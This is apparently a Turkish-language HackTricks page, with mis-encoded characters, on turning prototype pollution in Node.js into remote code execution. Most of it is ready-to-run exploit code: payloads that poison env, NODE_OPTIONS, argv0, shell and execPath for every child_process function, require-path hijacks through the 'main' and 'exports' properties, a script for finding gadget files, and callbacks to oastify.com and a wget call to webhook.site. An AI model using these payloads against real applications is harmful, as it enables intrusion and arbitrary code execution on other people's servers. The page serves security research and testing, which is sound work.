# Prototype Pollution to RCE

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Zafiyetli Kod

GerÃ§ek bir JS'in aÅŸaÄŸÄ±daki gibi bir kod kullanmasÄ±nÄ± hayal edin:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## Ã‡evre deÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla PP2RCE

**PP2RCE**, **Uzaktan Kod YÃ¼rÃ¼tme** anlamÄ±na gelir.

Bu [**makaleye**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) gÃ¶re bir **iÅŸlem** belirli bir yÃ¶ntemle **`child_process`** (Ã¶rneÄŸin `fork` veya `spawn` veya diÄŸerleri) tarafÄ±ndan baÅŸlatÄ±ldÄ±ÄŸÄ±nda, `normalizeSpawnArguments` yÃ¶ntemini Ã§aÄŸÄ±rÄ±r ve bu yÃ¶ntem yeni Ã§evre deÄŸiÅŸkenleri oluÅŸturmak iÃ§in bir **prototype pollution** aracÄ±dÄ±r:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
### **`__proto__` Zehirlenmesi**

{% hint style="warning" %}
Kodunuzu kontrol edin, gÃ¶rebileceÄŸiniz gibi, sadece **`.env`** Ã¶zelliÄŸini **zehirleyerek** **`envPairs`**'Ä± zehirlemek mÃ¼mkÃ¼ndÃ¼r.

**Not:** Node'un **`child_process`** kÃ¼tÃ¼phanesinden **`normalizeSpawnArguments`** iÅŸlevinin Ã§alÄ±ÅŸma ÅŸekli nedeniyle, bir iÅŸlem iÃ§in yeni bir Ã§evre deÄŸiÅŸkeni ayarlamak iÃ§in bir ÅŸey Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, sadece **herhangi bir ÅŸeyi zehirlemeniz** yeterlidir.\
Ã–rneÄŸin, `__proto__.avar="valuevar"` yaparsanÄ±z, iÅŸlem `avar` adÄ±nda `valuevar` deÄŸerine sahip bir deÄŸiÅŸkenle baÅŸlatÄ±lacaktÄ±r.

Ancak, **Ã§evre deÄŸiÅŸkeninin ilk sÄ±rada olmasÄ±** iÃ§in **`.env` Ã¶zelliÄŸini zehirlemeniz** ve (bazÄ± yÃ¶ntemlerde yalnÄ±zca) bu deÄŸiÅŸkenin **ilk sÄ±rada** olmasÄ± gerekmektedir (saldÄ±rÄ±ya izin verir).

Bu nedenle, aÅŸaÄŸÄ±daki saldÄ±rÄ±da **`NODE_OPTIONS`**'Ä±n **`.env` iÃ§inde olmadÄ±ÄŸÄ±nÄ±** gÃ¶rebilirsiniz.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
### `constructor.prototype` Zehirlenmesi
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE via env vars + cmdline

Ã–ncekiyle benzer deÄŸiÅŸiklikler yapÄ±larak Ã¶nerilen bir benzer yÃ¼k [**bu yazÄ±da**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)**.** Ana farklar ÅŸunlardÄ±r:

* Nodejs **payload**'Ä±nÄ± `/proc/self/environ` dosyasÄ±nÄ±n iÃ§ine deÄŸil, **`/proc/self/cmdline`**'in argv0'Ä±na saklar.
* ArdÄ±ndan, **`NODE_OPTIONS`** aracÄ±lÄ±ÄŸÄ±yla `/proc/self/environ` dosyasÄ±nÄ± gerektirmek yerine, **`/proc/self/cmdline`** dosyasÄ±nÄ± gerektirir.
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
## DNS EtkileÅŸimi

AÅŸaÄŸÄ±daki yÃ¼kler kullanÄ±larak Ã¶nceki olarak tartÄ±ÅŸtÄ±ÄŸÄ±mÄ±z NODE_OPTIONS Ã§evresel deÄŸiÅŸkenini kÃ¶tÃ¼ye kullanmak ve DNS etkileÅŸimi ile Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± tespit etmek mÃ¼mkÃ¼ndÃ¼r:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
Ya da, WAF'larÄ±n alan adÄ±nÄ± sormasÄ±nÄ± engellemek iÃ§in:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCE vuln child\_process fonksiyonlarÄ±

Bu bÃ¶lÃ¼mde, **`child_process`'ten her fonksiyonu** analiz ederek kodu yÃ¼rÃ¼tmek ve o fonksiyonun kodu yÃ¼rÃ¼tmesi iÃ§in herhangi bir teknik kullanÄ±p kullanamayacaÄŸÄ±mÄ±zÄ± gÃ¶receÄŸiz:

<details>

<summary><code>exec</code> sÃ¶mÃ¼rÃ¼sÃ¼</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
</details>

<details>

<summary><strong><code>execFile</code> sÃ¶mÃ¼rÃ¼sÃ¼</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
**`execFile`**'Ä±n Ã§alÄ±ÅŸabilmesi iÃ§in **NODE\_OPTIONS'Ä±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± GEREKÄ°R**.\
EÄŸer **node** Ã§alÄ±ÅŸtÄ±rÄ±lmÄ±yorsa, ne ÅŸekilde **Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ± deÄŸiÅŸtirebileceÄŸinizi** ve bunlarÄ± ayarlayabileceÄŸinizi bulmanÄ±z gerekir.

DiÄŸer teknikler, bu gereksinim olmadan Ã§alÄ±ÅŸÄ±r Ã§Ã¼nkÃ¼ **Ã§alÄ±ÅŸtÄ±rÄ±lan ÅŸeyi** prototip kirliliÄŸi aracÄ±lÄ±ÄŸÄ±yla **deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r**. (Bu durumda, `.shell`'i kirletseniz bile, yÃ¼rÃ¼tÃ¼len ÅŸeyi kirletmezsiniz).
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
<details>

<summary><strong><code>spawn</code> sÃ¶mÃ¼rÃ¼sÃ¼</strong></summary>
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
</details>

<details>

<summary><strong><code>execFileSync</code> sÃ¶mÃ¼rÃ¼sÃ¼</strong></summary>
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
</details>

<details>

<summary><strong><code>execSync</code> sÃ¶mÃ¼rÃ¼sÃ¼</strong></summary>
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
</details>

<details>

<summary><strong><code>spawnSync</code> sÃ¶mÃ¼rÃ¼sÃ¼</strong></summary>
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## Zorla Spawn KullanÄ±mÄ±

Ã–nceki Ã¶rneklerde, **`spawn`** Ã§aÄŸrÄ±sÄ±nÄ± yapan bir iÅŸlevin **mevcut olmasÄ± gerektiÄŸini** gÃ¶rdÃ¼nÃ¼z (bir ÅŸeyi yÃ¼rÃ¼tmek iÃ§in kullanÄ±lan **`child_process`** yÃ¶ntemlerinin hepsi bunu Ã§aÄŸÄ±rÄ±r). Ã–nceki Ã¶rnekte bu **kodun bir parÃ§asÄ±ydÄ±**, ancak kodun **bunu Ã§aÄŸÄ±rmadÄ±ÄŸÄ±nÄ±** varsayalÄ±m.

### Bir require dosya yolunu kontrol etme

Bu [**baÅŸka bir yazÄ±da**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) kullanÄ±cÄ±, bir **`require`** iÅŸleminin gerÃ§ekleÅŸtirileceÄŸi dosya yolunu kontrol edebilir. Bu senaryoda saldÄ±rgan sadece **sistem iÃ§inde bir `.js` dosyasÄ± bulmasÄ±** ve **ithal edildiÄŸinde bir spawn yÃ¶ntemi yÃ¼rÃ¼tecek bir dosya bulmasÄ±** gerekir.\
Ä°Ã§e aktarÄ±ldÄ±ÄŸÄ±nda spawn iÅŸlevini Ã§aÄŸÄ±ran yaygÄ±n dosyalardan bazÄ±larÄ± ÅŸunlardÄ±r:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* **Daha fazla dosya aÅŸaÄŸÄ±da**

AÅŸaÄŸÄ±daki basit betik, **child\_process**'ten **Ã§aÄŸrÄ±larÄ±** arayacaktÄ±r **(herhangi bir dolgu olmadan)** (iÅŸlevlerin iÃ§indeki Ã§aÄŸrÄ±larÄ± gÃ¶stermemek iÃ§in): 

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>Ã–nceki betik tarafÄ±ndan bulunan ilginÃ§ dosyalar</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### Prototype kirliliÄŸi aracÄ±lÄ±ÄŸÄ±yla gereken dosya yolunu ayarlama

{% hint style="warning" %}
**Ã–nceki teknik**, **kullanÄ±cÄ±nÄ±n gereken dosyanÄ±n yolunu kontrol etmesini gerektirir**. Ancak bu her zaman doÄŸru deÄŸildir.
{% endhint %}

Ancak, kodun prototype kirliliÄŸinden sonra bir gereksinim gerÃ§ekleÅŸtireceÄŸi durumlarda, gereken yolun kontrol edilmediÄŸi durumlarda bile **farklÄ± bir yol zorlayabilirsiniz**. Bu nedenle, kod satÄ±rÄ± `require("./a_file.js")` veya `require("bytes")` gibi olsa bile **kirliliÄŸe uÄŸrattÄ±ÄŸÄ±nÄ±z paketi gerektirecektir**.

Bu nedenle, prototype kirliliÄŸinizden sonra bir gereksinim gerÃ§ekleÅŸtirilirse ve spawn iÅŸlevi yoksa, bu saldÄ±rÄ±dÄ±r:

* **Sistem iÃ§inde bir `.js` dosyasÄ± bulun**
* **`child_process` kullanarak bir ÅŸeyi yÃ¼rÃ¼tecek** bir dosya gerektiÄŸinde
* SaldÄ±rdÄ±ÄŸÄ±nÄ±z platforma dosya yÃ¼kleyebiliyorsanÄ±z, bÃ¶yle bir dosya yÃ¼kleyebilirsiniz
* **Gereksinimi zorlamak iÃ§in yollarÄ± kirletin** ve `child_process` ile bir ÅŸey yÃ¼rÃ¼tecek `.js` dosyasÄ±nÄ±n gereksinimini zorlayÄ±n
* Bir gereksinim yapÄ±ldÄ±ktan sonra **Ã§evre/cmdline'Ä± kirletin** ve bir `child_process` yÃ¼rÃ¼tme iÅŸlevi Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda keyfi kod yÃ¼rÃ¼tÃ¼n (ilk tekniklere bakÄ±nÄ±z)

#### Mutlak gereksinim

YapÄ±lan gereksinim **mutlak** ise (`require("bytes")`) ve **paket `package.json` dosyasÄ±nda ana iÃ§ermiyorsa**, **`main` Ã¶zniteliÄŸini kirletebilir** ve **farklÄ± bir dosyanÄ±n gereksinimini yaptÄ±rabilirsiniz**.

{% tabs %}
{% tab title="sÄ±zma" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="kÃ¶tÃ¼niyetli.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
#### Ä°lgili gereksinim - 1

EÄŸer bir **gÃ¶receli yol** yerine mutlak bir yol yÃ¼klenirse, node'un **farklÄ± bir yol yÃ¼klemesini** saÄŸlayabilirsiniz:

{% tabs %}
{% tab title="sÄ±zma" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="kÃ¶tÃ¼_niyetli.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Ä°lgili require - 2

{% tabs %}
{% tab title="sÄ±zma" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="kÃ¶tÃ¼niyetli.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
#### GÃ¶receli gereksinim - 3

Ã–ncekine benzer ÅŸekilde, bu [**bu yazÄ±da**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs) bulundu.
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## Sanal Makine AraÃ§larÄ±

[https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) adresindeki makalede, **`vm`** kÃ¼tÃ¼phanesinin bazÄ± yÃ¶ntemlerinden **`contextExtensions`**'Ä±n kontrol edilebileceÄŸi belirtilmektedir.\
Ancak, Ã¶nceki **`child_process`** yÃ¶ntemleri gibi, en son sÃ¼rÃ¼mlerde **dÃ¼zeltildi**.

## DÃ¼zeltmeler ve Beklenmeyen Korumalar

LÃ¼tfen dikkat edin, prototip kirliliÄŸi, eriÅŸilen bir nesnenin **Ã¶zniteliÄŸi** **tanÄ±msÄ±z** ise Ã§alÄ±ÅŸÄ±r. EÄŸer **kod**da o **Ã¶znitelik** bir **deÄŸer** olarak **ayarlanmÄ±ÅŸsa Ã¼zerine yazamazsÄ±nÄ±z**.

Haziran 2022'de [**bu taahhÃ¼t**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a) ile `options` deÄŸiÅŸkeni `{}` yerine **`kEmptyObject`** olarak ayarlandÄ±. Bu, **`options`**'Ä±n **Ã¶zniteliklerini** etkileyen bir prototip kirliliÄŸinin RCE'ye yol aÃ§masÄ±nÄ± **engeller**.\
En azÄ±ndan v18.4.0'dan itibaren bu koruma **uygulanmÄ±ÅŸtÄ±r** ve dolayÄ±sÄ±yla `spawn` ve `spawnSync` yÃ¶ntemlerini etkileyen **saldÄ±rÄ±lar** artÄ±k Ã§alÄ±ÅŸmaz (eÄŸer `options` kullanÄ±lmÄ±yorsa!).

